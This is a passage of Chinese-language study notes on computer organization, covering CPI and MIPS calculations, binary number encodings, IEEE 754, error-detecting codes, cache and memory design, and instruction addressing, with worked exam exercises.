alt="image-20200608152105898"></p><p>答：平均CPI=2x0.5+ 3x0.2+4x0.1+5x0.2=3，即执行一个指令平均需要3个周期</p><p>MIPS为每秒可执行的百万条指令数，1.2GHZ为1200MHZ即一秒有1.2*10<sup>9</sup>个周期，总周期=一个指令所需周期*有多少指令。1200/3=400（M=10<sup>6</sup>,G=10<sup>9</sup>）</p><p>3.程序P在机器M上的执行时间是20s，编译优化后，P执行的指令数减少到原来的70%，而CPI增加到原来的1.2倍，则P在M上的执行时间是_______16.8s____</p><p>答：CPI即执行一条指令所需的时钟周期数。假设M机器原时钟周期为x,原CPI为y, P程序的指令数为z，可得P程序执行时间为xyz= 20s。</p><p>编译优化后M机器的CPI变为1.2y, P程序的指令数变为0.7z,则P程序执行时间为1.2*0.7xyz,故其执行时间为<br>16.8s。</p><p>4.某工作站采用时钟频率f为15MHz，处理速率为10MIP/S的处理机来执行一个已知混合程序。假定每次存储器存取为1周期延迟，此计算机的有效CPI是_______1.5_____________，假定将处理机的时钟频率提高到30MHz，但存储器子系统速率不变。这样，每次存储器存取需要两个时钟周期，如果30%指令每条只需要一次存储存取，而另外5%每条需要两次存储存取，还假定已知混合程序的指令数不变，并与原工作站兼容，则改进后的处理机性能相比原来的_______提高_____________</p><p>答：CPI即每个指令需多少周期，已知每秒有15*10<sup>6</sup>个周期，每秒可以处理10*10<sup>6</sup>个指令，那么总周期数/总指令数即为CPI</p><p>15*10<sup>6</sup>/10*10<sup>6</sup>=1.5    (注意和后面那个1周期延迟没有关系，不要被他迷惑，这个周期延迟已经被计算在前面的10MIP/s中了)</p><p>处理性能是否提高就看处理速率是否提高了。30%需要一次存取，由于每次存取增加了1周期延迟，那么这30%就得增加一个周期，而同理另外5%需要增加两周期。则CPI<sub>new</sub>=CPI<sub>原</sub>+30%*1+5%*2=1.9  (原CPI已经包括原来的1周期延迟，只需将计算新增的即可)</p><p>又已知现在每秒有30*10<sup>6</sup>个周期，那么处理速率为总周期数/每指令所需周期数=30×10<sup>6</sup>/(1.9×10<sup>6</sup>)= 15.79MIP/S，所以提高了</p><p>5.假定计算机M1和M2具有相同的指令集体系结构，主频分别为1.5 GHz和1.2 GHz。在M1和M2_上运行某基准程序P，平均CPI分别为2和1，则程序P在M1和M2_上运行时间的比值是?</p><p>答：M1的CPI为2即2周/指，而M2为1周/指。同样的程序P即指令数相同。M1的周期T1=1/1.5*10<sup>9</sup>，M2的周期T1=1/1.2*10<sup>9</sup></p><p>那么每条指令所需时间分别为2×T1和1×T2，指令数相同，那时间比值就等于一条指令所需时间比值即(2×T1)/(1*T2)=8/5</p><h1 id="yun-suan-fang-fa-he-yun-suan-qi">运算方法和运算器</h1><h2 id="zhi-shi-dian-1" id="知识点-v2"><a class="header-anchor" href="#知识点-v2">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200609143207561.png"  alt="image-20200609143207561" style="zoom: 80%;" />1.数字0在原码反码补码的表示</p><p>[+0]原码=0000 0000，  [-0]原码=1000 0000</p><p>[+0]反码=0000 0000，  [-0]反码=1111 1111</p><p>[+0]补码=0000 0000，  [-0]补码=0000 0000   （补码中是唯一的）</p><p>0的移码也是唯一的1000 0000</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200609151740827.png"  alt="image-20200609151740827" style="zoom:67%;" /><p>由于补码0是唯一的所以补码范围要多一个负数(总共都是256个数)</p><p>2.对于规格化的浮点数，尾数有三种形式：（小数点左边的是符号位）</p><ul><li><p>原码表示时尾数的小数点后第一数位为1，数符任意</p></li><li><p>补码和反码表示时尾数的符号位与小数点后第一数位不同</p></li><li><p>1.1xx……X(原码)</p></li><li><p>1.0XX……X(补码、反码)</p></li><li><p>0.1xx……x(原码、补码、反码)</p></li></ul><blockquote><p>原理是保证   1&gt; |M|≥ 0.5</p></blockquote><p>3.余3码就是8421码加3所得</p><p>4.奇偶校验码：加上校验码后1的个数为奇数就是奇校验。不具备纠错能力。</p><p>5.海明码：设有k个数据位，则应设r个校验位，r满足2<sup>r</sup>-1 ≥ k + r 。发现两位错误纠正一位错误。</p><p>6.循环冗余检验码(CRC)：k位校验位拼接在n位数据位后面，即为n+k，发现并纠正一位或多位错误</p><p>7.A的ascii码：65            a的ascii码：97</p><p>8.已知[x]<sub>补</sub>，求[-x]<sub>补</sub>：将[x]<sub>补</sub>连同符号位求反+1</p><p>9.移码就是补码的符号位求反</p><blockquote><p>由于负数的补码如-21(101011)看着好像大于21(010101)，实际正好是21更大，所以浮点数的阶码用移码表示能直观的看出大小便于加减运算</p></blockquote><p>10.-1的补码永远是全1(可理解为全1加1等于全0)</p><p>11.由于补码溢出无法看出是上溢(大于最大数)还是下溢，因此引入变形补码</p><ul><li>两个符号位不同时表溢出(01为正溢出，10为负溢出(看第一位))</li><li>最高位那个数代表真正的符号位</li><li>两个符号位均参与运算，若进位舍去</li></ul><p>12.IEEE754计算公式：真值x=(-1)<sup>S</sup><em>1.M</em>2<sup>e</sup>（S为符号位(正还是负)，E为阶码(转换成e代表多少次方)，M为尾数(小数点后面的数)，顺序为SEM）其中e=E-127(可记成大E大所以要减)</p><p>13.补码的1000 0000为什么代表-128</p><p><strong>补码就是同余</strong>，比如-3的原码是1011而它的反码是1100则补码为1101,无符号的1101是13和-3正好模2<sup>4</sup>同余</p><p>所以给出一个负数的补码将其看为无符号数减去2<sup>n</sup>(n为总位数)即代表真值</p><p>为什么会这样呢？4位二进制可表示16个数，那么想表示负数怎么办，就用同余的思想，-1就用15表示，-2就用14表示，-3就用13(1101)表示</p><p>回到本题，给出补码求真值，将其看成无符号数即为128，与128模2<sup>8</sup>同余的负数即为-128（也可用128-2<sup>8</sup>计算）</p><p>14.IEEE754的尾数用原码表示，阶码用指数的移码-1表示（所以E=e+127）</p><h2 id="xi-ti-1" id="习题-v2"><a class="header-anchor" href="#习题-v2">¶</a>习题</h2><p>1.写出D=101101的海明码</p><p>答：:one:首先确定检验位的个数：k=6，2<sup>r</sup>-1 ≥ k + r即2<sup>r</sup> ≥7+r，所以r=4</p><p>:two:确定检验码的位置：检验码P<sub>i</sub>(i=1,2…)的位置为2<sup>i-1</sup>（2<sup>0</sup>,2<sup>1</sup>,2<sup>2</sup>…）</p><p>注意从M10到M1，从大到小且没有0</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609150117418.png"  alt="image-20200609150117418"></p><p>:three:求出检验码的值：校验位Pi的值即为所有需要Pi校验的数据位求异或。</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200609150430484.png"  alt="image-20200609150430484" style="zoom:80%;" /><p>如P2对应M2，需要它的有D1即M3(2+1)、D3即M6(2+4)、D4即M7(2+4+1)…</p><p>所以最后的海明码为1011100100</p><p>2.已知x=11011，y=-10101，用变形补码计算x+y</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609154616627.png"  alt="image-20200609154616627" style="zoom:70%;" /><blockquote><p>注意一定要先转换成补码再添符号位运算</p></blockquote><p>3.假设M(x)=x<sup>3</sup>+1(发送信息的多项式)，G(x)=x<sup>3</sup>+x+1(生成多项式，代表校验位信息)。</p><p>:one: 那么M(x)代表的二进制码为: 1001(1*x<sup>3</sup>+1*x<sup>0</sup>)，G(x)代表的二进制码为: 1011</p><p>:two:将M(x)的多项式左移G(x)的最高次数，变为1001 000</p><p>:three:将1001 000对1011做模2除法得到余数为110,将其与被除数1001合并得到CRC码1001 110</p><blockquote><p>这里要注意第三步的模2除法和普通除法不同，模2除法不会向上一位借位也不比较被除数和除数的大小(位数相同即可)，如图中第三位商数(1101&gt;1000但仍可做减操作)<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609195155116.png"  alt="image-20200609195155116" style="zoom:80%;" /></p></blockquote><p>4.若浮点数x的754标准存储格式为(41360000)<sub>16</sub> ,求其浮点数的十进制数值。</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609225853843.png"  alt="image-20200609225853843"></p><blockquote><p>注意阶码没有符号位</p></blockquote><p>5.将数(20. 59375)<sub>10</sub>转换成754标准的32位浮点数的二进制存储格式。</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609230432591.png"  alt="image-20200609230432591"></p><p>6.某机器数为1000 0000B，若它代表0，则它是（原）码形式。若代表-128，则它是（补）码形式。若代表-127，则它是（反）码形式。</p><p>答：若是原码形式，就是-0。若是反码形式时，转换为原码就是1111 1111即-127(-(2<sup>7</sup>-1)) ，若是补码，1000 0000无符号时是2<sup>7</sup>=128，所以该补码代表-128（详情见上面知识点）</p><p>7.某机字长32位，其中1位符号位，31位表示尾数，若用定点小数表示，则最大正小数为多少？（B）</p><p>A.(1-2<sup>-32</sup>)B.(1- 2<sup>-31</sup> )C.2<sup>-32</sup>D.2<sup>-31</sup></p><p>答：这样的题就用4位的先试试。4位最大小数就是 0 111，也就是0.875  即1-2<sup>-3</sup>  所以可推出32位时最大是 1-2<sup>-31</sup></p><p>8.IEEE 754单精度浮点数格式表示的数中，最小的规范化正数为（A）</p><p>A.1.0x2<sup>-126</sup>B.1.0x2<sup>-127</sup>C.1.0x2<sup>-128</sup>D.1.0x2<sup>-149</sup></p><p>答：浮点数表示为1.M*2<sup>E</sup>，最小M为0,且E也要最小，这样往左移位越多数值越小，这样就转换成IEEE754中指数的最小值问题</p><p>对E来说，去除全1和全0(表0和无穷大)，E的范围为1~254，而e=E-127即e的范围为-126～+127，即指数最小为-126</p><p>所以本题答案为1.0*2<sup>-126</sup></p><p>9.若x=103,y=-25,则下列表达式采用8位定点补码运算实现时，会发生溢出的是 （ C ）</p><p>A.x+yB.-x+yC.x-yD.-x-y</p><p>答：不用转换成补码再算，直接算。四个选项中B的-128和C的128绝对值最大最可能溢出</p><p>而8位补码范围是-128~127，那就是C的128溢出了  (注意补码的0是唯一的所以多了个最大负数-128)</p><ol start="10"><li></li></ol><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200620135418708.png"  alt="image-20200620135418708"></p><p>答：这题的关键点是计算机使用补码参与运算的。-9的原码是1000 1001，补码是1111 0111，扩展到16位高位补1(也可写完整的16位原码再转换成补码)            x = 127，原码：0111 1111，补码：0111 1111，扩展到32位高位补0       z=x+y=118同理高位补0</p><p>11.整数x的机器数为1101 1000,分别对x进行逻辑右移1位和算术右移1位操作得到的机器数为_____________<u>0110 1100、1110 1100</u>______________</p><p>答：逻辑右移就是右移一位，左边补零即可。算术右移需要考虑符号位(算术要算所以补符号位)，右移一位，左边补符号位。</p><p>12.已知x=10111，y=11011，用变形补码求x-y</p><p>答：[x-y]<sub>补</sub>=[x]<sub>补</sub>+[-y]<sub>补</sub>，[x]补=00 10111，[-y]补=11 00101</p><p>00 10111+11 00101  =11 11100，结果没溢出转换为原码为1 00100即-00100  (注意得到的是补码要转换为真值)</p><blockquote><p>[y]补=00 11011，[-y]补=[y]补连同符号位求反加1=11 00101，当然也可直接求-11011的补码</p></blockquote><p>13.假定有4个整数用8位补码分别 表示r1=FEH,r2=F2H, r3=90H, r4=F8H,若将运算结果存放在 一个8位寄存器中，则下列运算会发生溢出的是（ B ）</p><p>A.r1×r2B.r2×r3C.r1×r4D.r2×r4</p><p>答：这种判断是否溢出的题就算出真值看看是否溢出。r1真值为-2，r2真值为-14，r3真值为-112，r4真值为-8</p><p>而这是补码运算最后得到的结果也是补码，8位补码范围为-128~127，所以显然r2*r3得到的结果转换为补码大于8位补码最大值</p><h1 id="duo-ceng-ci-de-cun-chu-qi">多层次的存储器</h1><h2 id="zhi-shi-dian-2" id="知识点-v3"><a class="header-anchor" href="#知识点-v3">¶</a>知识点</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610135354300.png"  alt="image-20200610135354300" style="zoom:80%;" /><p>1.存储器按存取方式可分为</p><ul><li><p>随机存取存储器（RAM）可读可写，断电即失(也称易失性)</p><ul><li>静态RAM(SRAM)   常用做高速缓冲存储器</li><li>动态RAM(DRAM)  常用做主存</li></ul></li><li><p>只读存储器（ROM）只读不写，断电保留(也称非易失性)</p></li><li><p>串行访问存储器</p><ul><li><p>顺序存取存储器（如磁带）</p></li><li><p>直接存取存储器（如磁盘）</p></li></ul></li></ul><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610140643769.png"  alt="image-20200610140643769" style="zoom:80%;" /><p>2.这些存储器名称中带E的都表示可擦除（可能出选择题，Erasable：可擦）</p><p>3.为了解决存储器大容量、低价格、高速度三者之间的矛盾关系，常采用多级存储器结构</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610140844977.png"  alt="image-20200610140844977" style="zoom:67%;" /><p><strong>缓存</strong>-主存层次主要解决CPU和主存速度不匹配的问题，数据交换由硬件完成。</p><p>主存-<strong>辅存</strong>层次主要解决存储系统的容量问题，数据交换由硬件和操作系统共同完成</p><p>4.存储器带宽就是每秒存储器存储的信息量</p><p>5.SRAM存取速度快但容量不如DRAM（记住SRAM用作高速缓冲存储器，速度肯定快）</p><blockquote><p>DRAM需要刷新会影响速度，所以SRAM速度更快但是价格昂贵</p></blockquote><p>6.DRAM采用电容存储，由于电荷量会减少所以必须定期(若不说明则是2ms)刷新,可分为</p><ul><li>集中刷新（集中到一段时间，集中歼灭）死时间是刷新总时间</li><li>分散刷新（每存取一次就刷新一次，分散歼灭）加倍存取周期实现死时间为0</li><li>异步刷新（折中方案，有计划的刷新）死时间就是一个存取周期</li></ul><blockquote><p>刷新的实质就是读出数据再写入（对行刷新，若不说明刷新一行等于一个存储周期）</p></blockquote><p>7.ROM也是随机存取(像数组下标一样访问)，但随机存取<strong>存储器</strong>要求可读可写，ROM只读，所以把ROM和RAM分开（第一个随机存取只是取信息的方式和存储器的随机存取含义不一样）</p><p>8.如果要求将容量为axb的芯片组成容量为cxd的芯片，假设需要芯片的数量为n,则n=(cxd)/axb     （a是字线连接地址线，b是位线连接数据线）</p><p>9.命中率：CPU要访问的信息在Cache中的比例（cache存取次数/(cache存取+主存存取)）</p><p>10.平均访问时间：t<sub>a</sub>=命中率×访问cache的时间+(1-命中率)×访问主存时间 (t<sub>a</sub>=ht<sub>c</sub>+(1-h)t<sub>m</sub>)</p><p>11.访问效率：访问Cache时间/平均访问时间 (e=t<sub>c</sub>/t<sub>a</sub>)</p><p>12.CPU与Cache之间传送数据的基本单位是字，而主存与Cache之间传送数据的基本单位是块(一块包括多个字)。（可理解为CPU容量少传输的也少，主存容量大传输的也大）</p><p>13.为了把主存的部分内容放到Cache中要把主存地址转换为Cache地址（因为主存和Cache用块传输，所以主要是块号的转换）</p><ul><li>直接映射        根据行号指定特定行比（适合大容量Cache）</li><li>全相联映射   与Cache所有行全都比（适合小容量Cache）</li><li>组相联映射   先根据组号找到对应组，再在组中一个一个比(折中的方法)</li></ul><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610171302861.png"  alt="image-20200610171302861"></p><blockquote><p>可以看到直接映射因为要找特定行，所以多了行号地址，组相联因为要找特定组所以多了组号地址，而全相联因为是一行一行比所以啥也没有</p></blockquote><p>14.替换策略：当要放新的东西而Cache满时就要替换</p><ul><li>最不经常使用(LFU即Least Frequently Used)算法     首先淘汰一定时期内被访问次数最少的</li><li>近期最少使用(LRU即Least Recently Used)算法     首先淘汰最长时间未被使用的</li><li>随机替换                              随缘替换</li></ul><p>15.Cache要和主存内容保持一致(CPU对Cache的写入更改了它)，所以要用到写操作策略</p><ul><li>写回法    只修改Cache的内容而不立即写入主存，此行被换出时写入主存</li><li>全写法(直写法、写直达)    Cache和主存同时修改</li><li>写一次法  处理和写回法一致，只是第一次命中要同时写入主存（折中处理）</li></ul><p>16.TLB(快表)、页表和Cache之间的命中关系</p><p>记住只要TLB(页表分为快表和慢表)和Cache有一个命中，页表一定命中，但页表命中那俩不一定命中(数据在主存不在Cache时)，也可能都不命中       （<strong>即页表最大</strong>）</p><p>17.DRAM采用地址复用技术，地址线为正常的一半，例如你计算的用10根地址线实际用5根就行 （先送行地址再送列地址）</p><h2 id="xi-ti-2" id="习题-v3"><a class="header-anchor" href="#习题-v3">¶</a>习题</h2><p>1.RAM和ROM的区别</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610145652114.png"  alt="image-20200610145652114"></p><p>答：RAM断电会失去信息而ROM不会，二者访问信息的方式都是随机存取。Cache需要可读可写，而Rom只能读不能写，肯定不适合。DRAM(动态RAM)才需要刷新。</p><p>2.Flash存储器</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610150200185.png"  alt="image-20200610150200185"></p><p>3.假定用若干个2K×4位芯片组成一个8K×8位存储器，则地址0B1FH所在芯片的最小地址是</p><p>答：8k*8/2k*4=8，需要8个芯片，8k=2<sup>13</sup>，所以需要13位地址。2个4位的芯片构成一个8位的(存取数据一次最少8位)，所以需要4组，片选地址为2位(位扩展两个要选中都是同时选中，所以只看字扩展)，剩下的为片内地址</p><p>:one: 每组芯片是2k*8即11个地址线，4组需要2位片选信号，所以每组后11位是从全0到全1</p><p>第1组芯片地址范围：000==0 0==000 0000 0000 ~ 0000 0111 1111 1111（黄色的为片选信号）</p><p>第2组芯片地址范围：000==0 1==000 0000 0000 ~ 0000 1111 1111 1111</p><p>第3组芯片地址范围：000==1 0==000 0000 0000 ~ 0001 0111 1111 1111</p><p>第4组芯片地址范围：000==1 1==000 0000 0000 ~ 0001 1111 1111 1111</p><p>0B1FH的地址格式是0000 1011 0001 1111，可知是第二组中的一个地址，这个地址所在芯片最小的为地址为0000 1000 0000 0000，即0800H</p><p>4.某计算机存储器按字节编址，主存地址空间大小为64MB，现用4MB×8位的RAM芯片组成32MB的主存储器，则存储器地址寄存器MAR的位数至少是（26位）。</p><p>答：MAR要能寻址整个存储器，虽然题目说组成32MB的主存，但是剩余的32MB以后也会用，所以也要考虑，64MB=2<sup>26</sup>，所以最少26位</p><p>5.假设 Cache完成缓存的次数为 2000次，主存完成存取的次数为50次。已知Cache的存储周期为50ns，主存的存储周期为200ns，试求:命中率、平均访问时间、效率。</p><p>答：:one:命中率为  2000/(2000+50)=97%</p><p>:two:t<sub>a</sub>=ht<sub>c</sub>+(1-h)t<sub>m</sub>=0.97*50ns+(1-0.97)*200ns=54.5ns（a表average,c表cache,m表main）</p><p>:three:效率e=t<sub>c</sub>/t<sub>a</sub>=50/54.5=91.7%</p><p>6.一个组相联cache由64个行组成，每组4行。主存储器包含4K个块，每块128字。请表示内存地址的格式。</p><p>答：128字=2<sup>7</sup>，所以字地址位数为7</p><p>Cache共64行，每组4行，所以需要16组，16=2<sup>4</sup>，即只需4位组号地址即可表示16组</p><p>:one: 主存有4k个块，每块128字，所以总共4k*128=2<sup>19</sup>，19-4-7=8即8位标记位</p><p>:two: 主存有4K个块，4k=2<sup>12</sup>，12-4=8，所以标记位需要8位</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610172722721.png"  alt="image-20200610172722721"></p><blockquote><p>注意这些地址是存放在主存的，所以总位数和主存的容量保持一致</p></blockquote><p>7.某容量为256MB的存储器由若干4M×8位的DRAM芯片构成，该DRAM芯片的地址引脚和数据引脚总数是 __________<em><strong>19</strong></em></p><p>答：注意是DRAM采用地址复用，4M=2<sup>22</sup>，地址复用所以11根就行，11+8=19</p><blockquote><p>注意地址线是2<sup>n</sup>(译码器译码)，而数据线是一个线对应一位</p></blockquote><p>8.下列各类存储器中,不采用随机存取方式的是( B)<br>A.EPROM               B.CD-ROM           C.DRAM            D.SRAM</p><p>答：CD-ROM即光盘，采用串行存取方式，它是只读型光盘存储器，不属于只读存储器ROM</p><p>9.某存储器容量为64KB ,按字节编址,地址4000H-5FFFH位ROM区,其余为RAM区,若用8Kx4位的SRAM芯片设计,则需要该芯片的数量为_______14____</p><p>答：这题主要是计算ROM区的容量，4000~5FFFH有5FFF-4000+1=2000H，而2000H=2<sup>13</sup>=8k（转换成二进制1在从右到左第13位(0开始)可类比10是2即2<sup>1</sup>），剩下的56kb为RAM，(56k*8)/(8k*4)=7*2=14</p><p>10.某系统的存储器为2MB，每字块为8个字，每字32位，若Cache为16KB，采用字节编址方式。</p><p>(1)采用直接映射，主存地址格式是什么？</p><p>(2)采用全相联映射，主存地址格式是什么？</p><p>(3)采用16路组相联映射，主存地址格式是什么？</p><p>答：一般都只给每块多少字写字号地址就行，既然这题说明一个字多少位了那么就要有字节地址<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610231019657.png"  alt="image-20200610231019657" style="zoom:80%;" /></p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610231039381.png"  alt="image-20200610231039381" style="zoom:80%;" /><p>16路组相联即每组16块，16kb是2<sup>14</sup>是字节即有2<sup>14</sup>*2<sup>3</sup>=2<sup>17</sup>位，现在需要知道有多少组</p><p>组数=2<sup>17</sup>/2<sup>4</sup>(每组16块)*2<sup>3</sup>(每字块8个字)*2<sup>5</sup>(1个字32位)=2<sup>5</sup>，所以组地址为5位</p><blockquote><p>注意单位要一致，kb是字节，也可以32位换算成字节计算</p><p>注意行号和组号是Cache的，块号地址是主存的，根据Cache的行号或组号把主存的块号映射到Cache中，这也是上面根据Cache容量推行号位数的原因。</p><p>如全相联，给定一个地址，CPU先根据块内地址然后依次和Cache的每行比较(通过标记)，若命中则按块内地址读取相关内容，若未命中就得到主存去读了(Cache命中率)</p></blockquote><p>11.某计算机存储器按字节编址，采用<strong>小端方式存放数据</strong>。 假定编译器规定int型和short型长度分别为32位和16位 ，并且<strong>数据按边界对齐存储</strong>。 某C语言程序段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">  <span class="keyword">int</span> a；</span><br><span class="line">  <span class="keyword">char</span> b；</span><br><span class="line">  short c；</span><br><span class="line">&#125;record；</span><br><span class="line">record.a=<span class="number">273</span>；</span><br></pre></td></tr></table></figure><p>若record变量的首地址为0XC008, 则低地址0XC008中内容为（）及record.c的地址是 （ ）</p><p>答：273 = 0X0000 0111(注意是十六进制不是二进制)，采用小端方式存放数据即高字节存放高地址，低字节存放低地址，273的低字节是11，所以低地址存11(往后依次是01,00,00)</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610234723093.png"  alt="image-20200610234723093" style="zoom:80%;" /><p>由上图看到0xC00D空了下来，因为题目说数据按边界对齐存储，b后面的c是short2字节，所以c的首地址也得是2的倍数(这样存储器访问一次就可取到数据，若不这样可能存储器一次取的正好是c的一部分，需要再访问一次才能得到完整的c，2的倍数则保证每次都能一次取到)</p><p>所以答案为0X11、0XC00E。</p><p>12.某计算机主存地址空间大小为256 MB， 按字节编址。虚拟地址空间大小为 4 GB，采用页式存储管理，页面大小为 4 KB， TLB（快表）采用全相联映射，有 4 个页表项， 内容如下表所示。则对虚拟地址03FF F180H 进行虚实地址变换的结果是（ ）</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200620230255835.png"  alt="image-20200620230255835" style="zoom:80%;" /><p>答：虚存地址空间4GB，则虚地址长度为32位。主存地址空间256MB，则主存地址长度为28位。页面大小4KB，则页内地址长度为<strong>12位</strong>。虚拟地址03FF F180H中<strong>180H</strong>为页内地址(十六进制的3位即二进制的12位和页内地址长度对应)，03FFFH(20位)为虚页号，查TLB(快表)发现，该页在主存中，其实页号为0153H，所以虚实地址变换后的结果为0153 180H(对应主存的28位)。</p><blockquote><p>TLB根据标记找若找到了但是有效位是0代表TLB缺失。若没找到去页表找若找到了但有效位是0代表缺页。</p></blockquote><p>13.某计算机的 Cache 共有 16 块，采用 2 路组相联映射方式，每个主存块大小为 32 字节，按字节编址。主存 129 号单元所在主存块应装入到 Cache 的组号是（ C ）</p><p>A.0B.2C.4D.6</p><p>答：采用2路组相联,所以一共是8组,从0开始,0 1 2 3 4 5 6 7.主存的某一字块按模8映像到Cache中的任一字块中.比如说主存中第0、8、16 字块是映像到Cache里第0组。每个主存块大小32字节，0-31号单元在第0块,32-63号单元在第1块,64-95号单元在第2块,96-127号单元在第3块.由此可见,主存129号单元位于主存中第4块的位置那么对应第4组</p><blockquote><p>注意块号和单元号都是从0开始</p></blockquote><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200620233829884.png"  alt="image-20200620233829884" style="zoom:80%;" /><p>14.若数组a及变量k均为int型，int型数据占4B，数据Cache采用直接映射方式，数据区大小为1KB、块大小为16B，该程序段执行前Cache为空，则该程序段执行过程中访问数组a的Cache缺失率约为 （ C ）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;<span class="number">1000</span>; k++)   </span><br><span class="line">a[k] = a[k]+<span class="number">32</span>;</span><br></pre></td></tr></table></figure><p>A.1.25%B.2.5 %C.12.5%D.25%</p><p>答：块大小为16B而int数据4B即每块有4个int数据。a[k] = a[k]+32;首先读取a[k]需访问一次a[k]，之后将结果赋值给a[k]又需要访问一次，即一个int访问两次。第一次访问a[k]未命中，并将该字所在的主存块调入Cache对应的块中。4个整数的各两次访问中只在访问第一个的第一个次时发生缺失，所以缺失率约为1/8=12.5%</p><h1 id="zhi-ling-xi-tong">指令系统</h1><h2 id="zhi-shi-dian-3" id="知识点-v4"><a class="header-anchor" href="#知识点-v4">¶</a>知识点</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200611145349442.png"  alt="image-20200611145349442" style="zoom:80%;" /><p>1.CISC：复杂指令系统计算机  （常用的20%频率占80%）C表Complex</p><p>RISC：精简指令系统计算机        少、固定、小但是寄存器数量多</p><p>2.二地址指令中根据操作数的物理位置，可分为</p><ul><li>SS(存储器-存储器)        速度最慢</li><li>RS(寄存器-存储器)        速度中间</li><li>RR(寄存器-寄存器)       速度最快</li><li>助记：S表Storage即存储器，R表Register即寄存器</li></ul><p>3.指令字长：一条指令所占的存储空间大小即二进制代码位数</p><p>机器字长：计算机一次能直接处理的二进制位数</p><p>若指令字长 = 机器字长，则称它为单字长指令，类比还有半字长指令、双字长指令</p><p>4.数据字和指令字的区别：一个字如果表数据那就是数据字，如果表指令那就是指令字</p><p>5.定长操作码指令：指令字的高位部分固定位数表示操作码，n位操作码最多表示2<sup>n</sup>条指令</p><p>6.不定长操作码设计规则</p><ul><li>不允许较短的是较长的前缀（这样可根据前缀直接判断它是零地址还是一地址…）</li><li>频率较高的指令分配较短的指令</li></ul><p>7.不定长操作码中的扩展位可理解成一个标志，你看到这个标志就知道它是0地址还是1地址…</p><p>8.指令寻址：找到下一条将要执行指令的地址</p><ul><li>顺序寻址（按顺序来如1-&gt;2-&gt;3）</li><li>跳跃寻址            （发生跳跃如1-&gt;2-&gt;6）</li></ul><p>9.数据寻址：找到当前正在执行指令的数据地址   多种寻址方式是为了压缩地址码长度</p><ul><li>隐含寻址       操作数隐含在某寄存器中</li><li>立即寻址       指令字中给出立即数，如MOV AX,1234H                         操作数=A</li><li>直接寻址       指令字中直接给出操作数的有效地址，如MOV AX,[8054H]             EA=A</li><li>间接寻址       指令字中给出的是操作数有效地址<strong>的地址</strong>                                           EA=(A)</li><li>寄存器寻址   指令字中给出寄存器的编号，根据编号取寄存器的数值                    EA=R<sub>i</sub></li><li>寄存器间接寻址  与寄存器寻址不同的是寄存器存的数值是操作数的有效地址      EA=(R<sub>i</sub>)</li><li>偏移寻址     A由指令字给出，R隐含给出           A+R的内容                              EA=A+®<ul><li>相对寻址        PC：程序计数器                                                                      EA=A+(PC)</li><li>基址寻址        BR：基址寄存器   形式地址A可控，(BR)不可控                   EA=A+(BR)</li><li>变址寻址        IX：变址寄存器    形式地址A不可控，IX的内容可控            EA=A+(IX)</li></ul></li></ul><blockquote><p>A表指令字给出的形式地址，(A)表A的内容，EA表有效地址</p></blockquote><p>10.低字节地址为字地址：低位字节的地址是字的起始地址</p><p>0X1234（左边是高字节，右边是低字节(可理解成右面是个位所以小)）</p><p>如0X4000：0X34             0X4001：0X12   即先存字符低位</p><h2 id="xi-ti-3" id="习题-v4"><a class="header-anchor" href="#习题-v4">¶</a>习题</h2><p>1.假设指令字长固定为16位，试设计一套指令系统满足以下要求:</p><p>1)有15条三地址指令。                             2)有12条二地址指令。<br>3)有62条一地址指令。                             4)有30条零地址指令。</p><p>答：三地址操作码15条用4位操作码即可，剩下的1111用作扩展(即只要看见前四个是1111那它就肯定是二地址指令)</p><p>12条二地址指令又需要4位操作码，即<strong>1111</strong> 0000 ~ <strong>1111</strong> 1011（12条）</p><p>剩余的1111 1100 ~ 1111 1111可用来扩展一地址指令(即看到前缀是它就代表是一地址指令)</p><p>1111 1100 ~ 1111 